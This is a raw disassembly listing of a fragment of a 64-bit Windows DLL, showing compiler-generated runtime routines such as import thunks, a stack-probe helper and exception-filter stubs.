   1800034bb:	89 05 93 2b 00 00    	mov    %eax,0x2b93(%rip)        # 0x180006054
   1800034c1:	b8 00 00 03 d0       	mov    $0xd0030000,%eax
   1800034c6:	44 23 d8             	and    %eax,%r11d
   1800034c9:	44 3b d8             	cmp    %eax,%r11d
   1800034cc:	75 18                	jne    0x1800034e6
   1800034ce:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   1800034d3:	24 e0                	and    $0xe0,%al
   1800034d5:	3c e0                	cmp    $0xe0,%al
   1800034d7:	75 0d                	jne    0x1800034e6
   1800034d9:	83 0d 74 2b 00 00 40 	orl    $0x40,0x2b74(%rip)        # 0x180006054
   1800034e0:	89 1d 6a 2b 00 00    	mov    %ebx,0x2b6a(%rip)        # 0x180006050
   1800034e6:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   1800034eb:	33 c0                	xor    %eax,%eax
   1800034ed:	48 8b 74 24 30       	mov    0x30(%rsp),%rsi
   1800034f2:	48 83 c4 10          	add    $0x10,%rsp
   1800034f6:	5f                   	pop    %rdi
   1800034f7:	c3                   	ret
   1800034f8:	b8 01 00 00 00       	mov    $0x1,%eax
   1800034fd:	c3                   	ret
   1800034fe:	cc                   	int3
   1800034ff:	cc                   	int3
   180003500:	33 c0                	xor    %eax,%eax
   180003502:	39 05 68 2b 00 00    	cmp    %eax,0x2b68(%rip)        # 0x180006070
   180003508:	0f 95 c0             	setne  %al
   18000350b:	c3                   	ret
   18000350c:	cc                   	int3
   18000350d:	cc                   	int3
   18000350e:	cc                   	int3
   18000350f:	cc                   	int3
   180003510:	e9 2f 00 00 00       	jmp    0x180003544
   180003515:	cc                   	int3
   180003516:	cc                   	int3
   180003517:	cc                   	int3
   180003518:	40 53                	rex push %rbx
   18000351a:	48 83 ec 20          	sub    $0x20,%rsp
   18000351e:	48 8d 05 bb 0d 00 00 	lea    0xdbb(%rip),%rax        # 0x1800042e0
   180003525:	48 8b d9             	mov    %rcx,%rbx
   180003528:	48 89 01             	mov    %rax,(%rcx)
   18000352b:	f6 c2 01             	test   $0x1,%dl
   18000352e:	74 0a                	je     0x18000353a
   180003530:	ba 18 00 00 00       	mov    $0x18,%edx
   180003535:	e8 d6 ff ff ff       	call   0x180003510
   18000353a:	48 8b c3             	mov    %rbx,%rax
   18000353d:	48 83 c4 20          	add    $0x20,%rsp
   180003541:	5b                   	pop    %rbx
   180003542:	c3                   	ret
   180003543:	cc                   	int3
   180003544:	e9 24 00 00 00       	jmp    0x18000356d
   180003549:	ff 25 79 0b 00 00    	jmp    *0xb79(%rip)        # 0x1800040c8
   18000354f:	ff 25 63 0b 00 00    	jmp    *0xb63(%rip)        # 0x1800040b8
   180003555:	ff 25 4d 0b 00 00    	jmp    *0xb4d(%rip)        # 0x1800040a8
   18000355b:	ff 25 6f 0b 00 00    	jmp    *0xb6f(%rip)        # 0x1800040d0
   180003561:	ff 25 49 0b 00 00    	jmp    *0xb49(%rip)        # 0x1800040b0
   180003567:	ff 25 73 0b 00 00    	jmp    *0xb73(%rip)        # 0x1800040e0
   18000356d:	ff 25 95 0b 00 00    	jmp    *0xb95(%rip)        # 0x180004108
   180003573:	ff 25 97 0b 00 00    	jmp    *0xb97(%rip)        # 0x180004110
   180003579:	ff 25 d1 0b 00 00    	jmp    *0xbd1(%rip)        # 0x180004150
   18000357f:	ff 25 c3 0b 00 00    	jmp    *0xbc3(%rip)        # 0x180004148
   180003585:	ff 25 75 0b 00 00    	jmp    *0xb75(%rip)        # 0x180004100
   18000358b:	ff 25 af 0b 00 00    	jmp    *0xbaf(%rip)        # 0x180004140
   180003591:	ff 25 a1 0b 00 00    	jmp    *0xba1(%rip)        # 0x180004138
   180003597:	ff 25 bb 0b 00 00    	jmp    *0xbbb(%rip)        # 0x180004158
   18000359d:	ff 25 8d 0b 00 00    	jmp    *0xb8d(%rip)        # 0x180004130
   1800035a3:	ff 25 7f 0b 00 00    	jmp    *0xb7f(%rip)        # 0x180004128
   1800035a9:	ff 25 71 0b 00 00    	jmp    *0xb71(%rip)        # 0x180004120
   1800035af:	cc                   	int3
   1800035b0:	b0 01                	mov    $0x1,%al
   1800035b2:	c3                   	ret
   1800035b3:	cc                   	int3
   1800035b4:	33 c0                	xor    %eax,%eax
   1800035b6:	c3                   	ret
   1800035b7:	cc                   	int3
   1800035b8:	48 83 ec 28          	sub    $0x28,%rsp
   1800035bc:	4d 8b 41 38          	mov    0x38(%r9),%r8
   1800035c0:	48 8b ca             	mov    %rdx,%rcx
   1800035c3:	49 8b d1             	mov    %r9,%rdx
   1800035c6:	e8 0d 00 00 00       	call   0x1800035d8
   1800035cb:	b8 01 00 00 00       	mov    $0x1,%eax
   1800035d0:	48 83 c4 28          	add    $0x28,%rsp
   1800035d4:	c3                   	ret
   1800035d5:	cc                   	int3
   1800035d6:	cc                   	int3
   1800035d7:	cc                   	int3
   1800035d8:	40 53                	rex push %rbx
   1800035da:	45 8b 18             	mov    (%r8),%r11d
   1800035dd:	48 8b da             	mov    %rdx,%rbx
   1800035e0:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   1800035e4:	4c 8b c9             	mov    %rcx,%r9
   1800035e7:	41 f6 00 04          	testb  $0x4,(%r8)
   1800035eb:	4c 8b d1             	mov    %rcx,%r10
   1800035ee:	74 13                	je     0x180003603
   1800035f0:	41 8b 40 08          	mov    0x8(%r8),%eax
   1800035f4:	4d 63 50 04          	movslq 0x4(%r8),%r10
   1800035f8:	f7 d8                	neg    %eax
   1800035fa:	4c 03 d1             	add    %rcx,%r10
   1800035fd:	48 63 c8             	movslq %eax,%rcx
   180003600:	4c 23 d1             	and    %rcx,%r10
   180003603:	49 63 c3             	movslq %r11d,%rax
   180003606:	4a 8b 14 10          	mov    (%rax,%r10,1),%rdx
   18000360a:	48 8b 43 10          	mov    0x10(%rbx),%rax
   18000360e:	8b 48 08             	mov    0x8(%rax),%ecx
   180003611:	48 8b 43 08          	mov    0x8(%rbx),%rax
   180003615:	f6 44 01 03 0f       	testb  $0xf,0x3(%rcx,%rax,1)
   18000361a:	74 0b                	je     0x180003627
   18000361c:	0f b6 44 01 03       	movzbl 0x3(%rcx,%rax,1),%eax
   180003621:	83 e0 f0             	and    $0xfffffff0,%eax
   180003624:	4c 03 c8             	add    %rax,%r9
   180003627:	4c 33 ca             	xor    %rdx,%r9
   18000362a:	49 8b c9             	mov    %r9,%rcx
   18000362d:	5b                   	pop    %rbx
   18000362e:	e9 3d f0 ff ff       	jmp    0x180002670
   180003633:	cc                   	int3
   180003634:	48 8b c4             	mov    %rsp,%rax
   180003637:	48 89 58 08          	mov    %rbx,0x8(%rax)
   18000363b:	48 89 68 10          	mov    %rbp,0x10(%rax)
   18000363f:	48 89 70 18          	mov    %rsi,0x18(%rax)
   180003643:	48 89 78 20          	mov    %rdi,0x20(%rax)
   180003647:	41 56                	push   %r14
   180003649:	48 83 ec 20          	sub    $0x20,%rsp
   18000364d:	4d 8b 51 38          	mov    0x38(%r9),%r10
   180003651:	48 8b f2             	mov    %rdx,%rsi
   180003654:	4d 8b f0             	mov    %r8,%r14
   180003657:	48 8b e9             	mov    %rcx,%rbp
   18000365a:	49 8b d1             	mov    %r9,%rdx
   18000365d:	48 8b ce             	mov    %rsi,%rcx
   180003660:	49 8b f9             	mov    %r9,%rdi
   180003663:	41 8b 1a             	mov    (%r10),%ebx
   180003666:	48 c1 e3 04          	shl    $0x4,%rbx
   18000366a:	49 03 da             	add    %r10,%rbx
   18000366d:	4c 8d 43 04          	lea    0x4(%rbx),%r8
   180003671:	e8 62 ff ff ff       	call   0x1800035d8
   180003676:	8b 45 04             	mov    0x4(%rbp),%eax
   180003679:	24 66                	and    $0x66,%al
   18000367b:	f6 d8                	neg    %al
   18000367d:	b8 01 00 00 00       	mov    $0x1,%eax
   180003682:	1b d2                	sbb    %edx,%edx
   180003684:	f7 da                	neg    %edx
   180003686:	03 d0                	add    %eax,%edx
   180003688:	85 53 04             	test   %edx,0x4(%rbx)
   18000368b:	74 11                	je     0x18000369e
   18000368d:	4c 8b cf             	mov    %rdi,%r9
   180003690:	4d 8b c6             	mov    %r14,%r8
   180003693:	48 8b d6             	mov    %rsi,%rdx
   180003696:	48 8b cd             	mov    %rbp,%rcx
   180003699:	e8 ab fe ff ff       	call   0x180003549
   18000369e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800036a3:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1800036a8:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1800036ad:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   1800036b2:	48 83 c4 20          	add    $0x20,%rsp
   1800036b6:	41 5e                	pop    %r14
   1800036b8:	c3                   	ret
   1800036b9:	cc                   	int3
   1800036ba:	cc                   	int3
   1800036bb:	cc                   	int3
   1800036bc:	cc                   	int3
   1800036bd:	cc                   	int3
   1800036be:	cc                   	int3
   1800036bf:	cc                   	int3
   1800036c0:	cc                   	int3
   1800036c1:	cc                   	int3
   1800036c2:	cc                   	int3
   1800036c3:	cc                   	int3
   1800036c4:	cc                   	int3
   1800036c5:	cc                   	int3
   1800036c6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1800036cd:	00 00 00 
   1800036d0:	48 83 ec 10          	sub    $0x10,%rsp
   1800036d4:	4c 89 14 24          	mov    %r10,(%rsp)
   1800036d8:	4c 89 5c 24 08       	mov    %r11,0x8(%rsp)
   1800036dd:	4d 33 db             	xor    %r11,%r11
   1800036e0:	4c 8d 54 24 18       	lea    0x18(%rsp),%r10
   1800036e5:	4c 2b d0             	sub    %rax,%r10
   1800036e8:	4d 0f 42 d3          	cmovb  %r11,%r10
   1800036ec:	65 4c 8b 1c 25 10 00 	mov    %gs:0x10,%r11
   1800036f3:	00 00 
   1800036f5:	4d 3b d3             	cmp    %r11,%r10
   1800036f8:	73 16                	jae    0x180003710
   1800036fa:	66 41 81 e2 00 f0    	and    $0xf000,%r10w
   180003700:	4d 8d 9b 00 f0 ff ff 	lea    -0x1000(%r11),%r11
   180003707:	41 c6 03 00          	movb   $0x0,(%r11)
   18000370b:	4d 3b d3             	cmp    %r11,%r10
   18000370e:	75 f0                	jne    0x180003700
   180003710:	4c 8b 14 24          	mov    (%rsp),%r10
   180003714:	4c 8b 5c 24 08       	mov    0x8(%rsp),%r11
   180003719:	48 83 c4 10          	add    $0x10,%rsp
   18000371d:	c3                   	ret
   18000371e:	ff 25 b4 09 00 00    	jmp    *0x9b4(%rip)        # 0x1800040d8
   180003724:	cc                   	int3
   180003725:	cc                   	int3
   180003726:	cc                   	int3
   180003727:	cc                   	int3
   180003728:	cc                   	int3
   180003729:	cc                   	int3
   18000372a:	cc                   	int3
   18000372b:	cc                   	int3
   18000372c:	cc                   	int3
   18000372d:	cc                   	int3
   18000372e:	cc                   	int3
   18000372f:	cc                   	int3
   180003730:	cc                   	int3
   180003731:	cc                   	int3
   180003732:	cc                   	int3
   180003733:	cc                   	int3
   180003734:	cc                   	int3
   180003735:	cc                   	int3
   180003736:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000373d:	00 00 00 
   180003740:	ff e0                	jmp    *%rax
   180003742:	cc                   	int3
   180003743:	cc                   	int3
   180003744:	cc                   	int3
   180003745:	cc                   	int3
   180003746:	cc                   	int3
   180003747:	cc                   	int3
   180003748:	cc                   	int3
   180003749:	cc                   	int3
   18000374a:	cc                   	int3
   18000374b:	cc                   	int3
   18000374c:	cc                   	int3
   18000374d:	cc                   	int3
   18000374e:	cc                   	int3
   18000374f:	cc                   	int3
   180003750:	cc                   	int3
   180003751:	cc                   	int3
   180003752:	cc                   	int3
   180003753:	cc                   	int3
   180003754:	cc                   	int3
   180003755:	cc                   	int3
   180003756:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000375d:	00 00 00 
   180003760:	ff 25 4a 0a 00 00    	jmp    *0xa4a(%rip)        # 0x1800041b0
   180003766:	40 55                	rex push %rbp
   180003768:	48 83 ec 20          	sub    $0x20,%rsp
   18000376c:	48 8b ea             	mov    %rdx,%rbp
   18000376f:	8a 4d 40             	mov    0x40(%rbp),%cl
   180003772:	48 83 c4 20          	add    $0x20,%rsp
   180003776:	5d                   	pop    %rbp
   180003777:	e9 14 f8 ff ff       	jmp    0x180002f90
   18000377c:	cc                   	int3
   18000377d:	40 55                	rex push %rbp
   18000377f:	48 83 ec 20          	sub    $0x20,%rsp
   180003783:	48 8b ea             	mov    %rdx,%rbp
   180003786:	8a 4d 20             	mov    0x20(%rbp),%cl
   180003789:	e8 02 f8 ff ff       	call   0x180002f90
   18000378e:	90                   	nop
   18000378f:	48 83 c4 20          	add    $0x20,%rsp
   180003793:	5d                   	pop    %rbp
   180003794:	c3                   	ret
   180003795:	cc                   	int3
   180003796:	40 55                	rex push %rbp
   180003798:	48 83 ec 20          	sub    $0x20,%rsp
   18000379c:	48 8b ea             	mov    %rdx,%rbp
   18000379f:	48 83 c4 20          	add    $0x20,%rsp
   1800037a3:	5d                   	pop    %rbp
   1800037a4:	e9 73 f6 ff ff       	jmp    0x180002e1c
   1800037a9:	cc                   	int3
   1800037aa:	40 55                	rex push %rbp
   1800037ac:	48 83 ec 30          	sub    $0x30,%rsp
   1800037b0:	48 8b ea             	mov    %rdx,%rbp
   1800037b3:	48 8b 01             	mov    (%rcx),%rax
   1800037b6:	8b 10                	mov    (%rax),%edx
   1800037b8:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1800037bd:	89 54 24 20          	mov    %edx,0x20(%rsp)
   1800037c1:	4c 8d 0d d0 ee ff ff 	lea    -0x1130(%rip),%r9        # 0x180002698
   1800037c8:	4c 8b 45 70          	mov    0x70(%rbp),%r8
   1800037cc:	8b 55 68             	mov    0x68(%rbp),%edx
   1800037cf:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   1800037d3:	e8 b4 f5 ff ff       	call   0x180002d8c
   1800037d8:	90                   	nop
   1800037d9:	48 83 c4 30          	add    $0x30,%rsp
   1800037dd:	5d                   	pop    %rbp
   1800037de:	c3                   	ret
   1800037df:	cc                   	int3
   1800037e0:	40 55                	rex push %rbp
   1800037e2:	48 8b ea             	mov    %rdx,%rbp
   1800037e5:	48 8b 01             	mov    (%rcx),%rax
   1800037e8:	33 c9                	xor    %ecx,%ecx
   1800037ea:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   1800037f0:	0f 94 c1             	sete   %cl
   1800037f3:	8b c1                	mov    %ecx,%eax
   1800037f5:	5d                   	pop    %rbp
   1800037f6:	c3                   	ret
   1800037f7:	cc                   	int3
